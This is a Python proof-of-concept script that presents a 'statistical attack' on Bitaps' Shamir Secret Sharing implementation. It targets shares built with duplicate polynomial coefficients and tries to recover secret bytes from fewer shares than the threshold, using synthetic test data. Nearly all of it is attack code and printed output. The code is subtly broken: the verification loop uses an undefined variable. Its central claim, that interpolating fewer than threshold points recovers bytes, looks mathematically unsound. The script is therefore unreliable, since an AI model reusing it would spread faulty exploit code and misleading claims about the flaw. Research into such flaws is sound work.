#!/usr/bin/env python3
"""
Statistical Attack on Bitaps Shamir Secret Sharing

This script demonstrates how to detect vulnerable shares created with
duplicate coefficients through statistical analysis and brute-force
recovery attempts.
"""

import sys
from itertools import combinations
from collections import defaultdict

# Import GF(256) functions from the exploit script
from exploit_duplicate_coefficients import (
    _gf256_add, _gf256_mul, _gf256_pow, _gf256_div, _gf256_sub, _gf256_inverse,
    _fn, _interpolation, create_vulnerable_shares_with_duplicates
)

def generate_test_shares_secure(secret, threshold, num_shares):
    """Generate shares with unique coefficients (secure)"""
    import random
    share_indices = list(range(1, num_shares + 1))

    # Generate unique random coefficients
    coefficients = []
    while len(coefficients) < threshold - 1:
        coeff = random.randint(1, 255)
        if coeff not in coefficients:
            coefficients.append(coeff)

    shares_dict = {}
    for byte_val in secret:
        byte_shares, _ = create_vulnerable_shares_with_duplicates(
            byte_val, threshold, share_indices, coefficients
        )
        for idx in share_indices:
            if idx not in shares_dict:
                shares_dict[idx] = []
            shares_dict[idx].append(byte_shares[idx])

    # Convert to bytes
    return {idx: bytes(vals) for idx, vals in shares_dict.items()}

def generate_test_shares_vulnerable(secret, threshold, num_shares, duplicate_rate=0.5):
    """
    Generate shares with some bytes having duplicate coefficients (vulnerable)

    duplicate_rate: probability that a byte's polynomial has duplicate coefficients
    """
    import random
    share_indices = list(range(1, num_shares + 1))

    shares_dict = {idx: [] for idx in share_indices}

    for byte_val in secret:
        # Randomly decide if this byte gets duplicate coefficients
        if random.random() < duplicate_rate:
            # Vulnerable: duplicate coefficients
            coeff = random.randint(1, 255)
            coefficients = [coeff] * (threshold - 1)
        else:
            # Secure: unique coefficients
            coefficients = []
            while len(coefficients) < threshold - 1:
                coeff = random.randint(1, 255)
                if coeff not in coefficients:
                    coefficients.append(coeff)

        byte_shares, _ = create_vulnerable_shares_with_duplicates(
            byte_val, threshold, share_indices, coefficients
        )

        for idx in share_indices:
            shares_dict[idx].append(byte_shares[idx])

    # Convert to bytes
    return {idx: bytes(vals) for idx, vals in shares_dict.items()}

def attempt_recovery_with_k_shares(shares, k, byte_position):
    """
    Try to recover a specific byte using only k shares
    Returns set of all possible recovered values
    """
    recovered_values = set()

    for combo in combinations(shares.keys(), k):
        try:
            points = [(idx, shares[idx][byte_position]) for idx in combo]
            recovered = _interpolation(points, x=0)
            recovered_values.add(recovered)
        except:
            pass

    return recovered_values

def statistical_attack(shares, declared_threshold, secret_length):
    """
    Statistical attack to detect and exploit vulnerable bytes

    Returns:
        - bytes_with_reduced_threshold: dict mapping byte_pos to actual threshold
        - partial_recovery: dict mapping byte_pos to recovered value
    """
    print("=" * 70)
    print("STATISTICAL ATTACK IN PROGRESS")
    print("=" * 70)
    print()

    vulnerable_bytes = {}
    partial_recovery = {}

    print(f"Target: {secret_length}-byte secret")
    print(f"Declared threshold: {declared_threshold}")
    print(f"Available shares: {len(shares)}")
    print()

    # For each byte position, try to recover with fewer shares
    for byte_pos in range(secret_length):
        print(f"Analyzing byte position {byte_pos}...", end=" ")

        # Try recovering with k shares for k = 2 to threshold-1
        for k in range(2, declared_threshold):
            recovered_values = attempt_recovery_with_k_shares(shares, k, byte_pos)

            # If we get consistent recovery with k shares, the actual threshold is k
            if len(recovered_values) == 1:
                recovered_value = list(recovered_values)[0]

                # Verify with different combinations
                verification_count = 0
                for combo in list(combinations(shares.keys(), k))[:5]:  # Check 5 combos
                    points = [(idx, shares[idx][byte_position]) for idx in combo]
                    if _interpolation(points, x=0) == recovered_value:
                        verification_count += 1

                if verification_count >= 3:
                    print(f"✗ VULNERABLE! Recovered with only {k} shares: {recovered_value:#04x}")
                    vulnerable_bytes[byte_pos] = k
                    partial_recovery[byte_pos] = recovered_value
                    break
        else:
            print("✓ Secure (requires full threshold)")

    print()
    print("=" * 70)
    print("ATTACK RESULTS")
    print("=" * 70)
    print()

    if vulnerable_bytes:
        print(f"Vulnerable byte positions: {len(vulnerable_bytes)}/{secret_length}")
        print()

        print("Byte Position | Actual Threshold | Recovered Value")
        print("-" * 54)
        for byte_pos in sorted(vulnerable_bytes.keys()):
            actual_threshold = vulnerable_bytes[byte_pos]
            recovered = partial_recovery[byte_pos]
            print(f"      {byte_pos:2d}      |        {actual_threshold}         |     {recovered:#04x}")

        print()
        print(f"Security reduction: {len(vulnerable_bytes)/secret_length*100:.1f}% of bytes compromised")
    else:
        print("No vulnerabilities detected. All bytes require full threshold.")

    print()
    return vulnerable_bytes, partial_recovery

def full_secret_recovery_attack(shares, declared_threshold, secret_length):
    """
    Attempt to recover the full secret by exploiting vulnerable bytes
    """
    print("=" * 70)
    print("FULL SECRET RECOVERY ATTACK")
    print("=" * 70)
    print()

    recovered_secret = bytearray(secret_length)
    confidence = [0.0] * secret_length  # Confidence level for each byte

    for byte_pos in range(secret_length):
        print(f"Recovering byte {byte_pos}...", end=" ")

        best_candidate = None
        best_k = declared_threshold + 1

        # Try with progressively more shares
        for k in range(2, declared_threshold + 1):
            recovered_values = attempt_recovery_with_k_shares(shares, k, byte_pos)

            # Check consistency across different k-share combinations
            if len(recovered_values) == 1:
                candidate = list(recovered_values)[0]

                # Verify with full threshold
                points = [(idx, shares[idx][byte_pos]) for idx in list(shares.keys())[:declared_threshold]]
                verified = _interpolation(points, x=0)

                if candidate == verified and k < best_k:
                    best_candidate = candidate
                    best_k = k

        if best_candidate is not None:
            recovered_secret[byte_pos] = best_candidate
            confidence[byte_pos] = (declared_threshold - best_k + 1) / declared_threshold
            print(f"✓ {best_candidate:#04x} (threshold: {best_k}, confidence: {confidence[byte_pos]:.1%})")
        else:
            # Use full threshold recovery
            points = [(idx, shares[idx][byte_pos]) for idx in list(shares.keys())[:declared_threshold]]
            recovered_secret[byte_pos] = _interpolation(points, x=0)
            confidence[byte_pos] = 1.0
            print(f"✓ {recovered_secret[byte_pos]:#04x} (threshold: {declared_threshold}, confidence: 100%)")

    print()
    print("Recovered secret:", bytes(recovered_secret).hex())
    print(f"Average confidence: {sum(confidence)/len(confidence):.1%}")
    print()

    return bytes(recovered_secret), confidence

def main():
    print("=" * 70)
    print("BITAPS SHAMIR SECRET SHARING - STATISTICAL ATTACK")
    print("=" * 70)
    print()

    # Test parameters
    secret = b"This is a secret message!"  # 25 bytes
    threshold = 3
    num_shares = 5

    print("Test Configuration:")
    print(f"  Secret: {secret.decode()}")
    print(f"  Secret length: {len(secret)} bytes")
    print(f"  Threshold: {threshold}")
    print(f"  Total shares: {num_shares}")
    print()

    # Test 1: Attack secure implementation
    print("\n" + "=" * 70)
    print("TEST 1: Attack SECURE implementation (unique coefficients)")
    print("=" * 70)
    print()

    secure_shares = generate_test_shares_secure(secret, threshold, num_shares)
    print("Generated secure shares:")
    for idx, share in list(secure_shares.items())[:3]:
        print(f"  Share[{idx}]: {share.hex()[:40]}...")
    print()

    vulnerable_bytes, partial_recovery = statistical_attack(
        secure_shares, threshold, len(secret)
    )

    if not vulnerable_bytes:
        print("✓ SECURE: No vulnerabilities detected in secure implementation")
    print()

    # Test 2: Attack vulnerable implementation
    print("\n" + "=" * 70)
    print("TEST 2: Attack VULNERABLE implementation (50% duplicate rate)")
    print("=" * 70)
    print()

    vulnerable_shares = generate_test_shares_vulnerable(
        secret, threshold, num_shares, duplicate_rate=0.5
    )
    print("Generated vulnerable shares:")
    for idx, share in list(vulnerable_shares.items())[:3]:
        print(f"  Share[{idx}]: {share.hex()[:40]}...")
    print()

    vulnerable_bytes, partial_recovery = statistical_attack(
        vulnerable_shares, threshold, len(secret)
    )

    if vulnerable_bytes:
        print(f"✗ VULNERABLE: {len(vulnerable_bytes)} bytes compromised")
        print()

        # Attempt full secret recovery
        recovered_secret, confidence = full_secret_recovery_attack(
            vulnerable_shares, threshold, len(secret)
        )

        print("=" * 70)
        print("FINAL RESULTS")
        print("=" * 70)
        print()
        print(f"Original secret:  {secret}")
        print(f"Recovered secret: {recovered_secret}")
        print()

        if recovered_secret == secret:
            print("✗ CRITICAL: Full secret recovered successfully!")
        else:
            print("Partial recovery achieved:")
            for i, (orig, rec) in enumerate(zip(secret, recovered_secret)):
                if orig == rec:
                    print(f"  Byte {i:2d}: ✓ {chr(orig)}")
                else:
                    print(f"  Byte {i:2d}: ✗ {chr(orig)} != {chr(rec)}")
    print()

    # Test 3: Extreme vulnerability (all duplicates)
    print("\n" + "=" * 70)
    print("TEST 3: Attack EXTREME vulnerability (100% duplicate rate)")
    print("=" * 70)
    print()

    extreme_shares = generate_test_shares_vulnerable(
        secret, threshold, num_shares, duplicate_rate=1.0
    )

    vulnerable_bytes, partial_recovery = statistical_attack(
        extreme_shares, threshold, len(secret)
    )

    if vulnerable_bytes:
        print(f"✗ CRITICAL: ALL {len(vulnerable_bytes)} bytes compromised")
        print()

        recovered_secret, confidence = full_secret_recovery_attack(
            extreme_shares, threshold, len(secret)
        )

        print("=" * 70)
        print(f"Recovery success: {recovered_secret == secret}")
        print("=" * 70)
    print()

if __name__ == "__main__":
    try:
        main()

        print("=" * 70)
        print("CONCLUSIONS")
        print("=" * 70)
        print()
        print("This attack demonstrates that:")
        print()
        print("1. Duplicate polynomial coefficients can be detected through")
        print("   statistical analysis and brute-force recovery attempts")
        print()
        print("2. Each byte with duplicate coefficients reduces the effective")
        print("   threshold for that byte")
        print()
        print("3. An attacker with fewer than the threshold number of shares")
        print("   can recover parts (or all) of the secret")
        print()
        print("4. The vulnerability is systematic in the Python implementation")
        print("   due to missing uniqueness checks")
        print()
        print("MITIGATION: Always check coefficient uniqueness during generation!")
        print()

    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
